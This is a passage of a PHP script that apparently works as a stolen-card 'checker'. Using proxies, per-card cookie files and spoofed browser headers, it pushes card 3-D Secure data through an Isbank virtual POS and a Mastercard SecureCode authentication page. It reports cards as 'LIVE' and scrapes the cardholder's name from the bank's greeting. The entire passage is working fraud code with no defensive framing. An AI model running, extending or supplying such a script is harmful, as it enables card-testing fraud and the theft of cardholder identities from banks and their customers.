<?php
$first_url         = explode('"', explode('action="', $result)[1])[0];
if (!$what_3ds){
    $end_time = microtime(true);
    $execution_time = intval($end_time - $start_time); 
    exit("LIVE;Aprovada ($execution_time"."s)");
}

curl_setopt_array($ch, array(
    CURLOPT_URL => $first_url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => $proxy,
    CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => 'PaReq='.urlencode($PaReq).'&TermUrl='.urlencode($TermUrl).'&MD='.urlencode($TermUrl).'$_charset_=UTF-8',
    CURLOPT_HTTPHEADER => array(
        'Upgrade-Insecure-Requests: 1',
        'Origin: https://vpos3.isbank.com.tr',
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: https://vpos3.isbank.com.tr/',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
    ),
));
$first_request = curl_exec($ch);

$second_url    = html_entity_decode(explode('"', explode('action="', $first_request)[1])[0]);
$params = explode('input type="hidden" name="', $first_request);
$first_params = True;
$post_params = '';

foreach ($params as $value) {
    if (!$first_params){
        if ($post_params != ''){
            $post_params .= '&';
        }
        $post_params .= explode('"', $value)[0];
        $post_params .= '=';
        $post_params .= urlencode(html_entity_decode(explode('"', $value)[2]));
    }
    $first_params = False;
}

curl_setopt_array($ch, array(
    CURLOPT_URL => $second_url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => $proxy,
    CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $post_params,
    CURLOPT_HTTPHEADER => array(
        'Upgrade-Insecure-Requests: 1',
        'Origin: https://mastercardsecurecode.secureacs.com',
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: https://mastercardsecurecode.secureacs.com/AcsPreAuthenticationWEB/PreAuthenticationServlet',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    )
));
$second_request = curl_exec($ch);

if (strpos($second_request, 'Olá ')!==false){
    exit('LIVE;NOME: '.explode('.', explode('Olá ', $second_request)[1])[0]);
}
// $nome = explode('Olá ', $second_request)[1];
// $nome = explode('.', $nome)[0];
exit("Cartão inválido");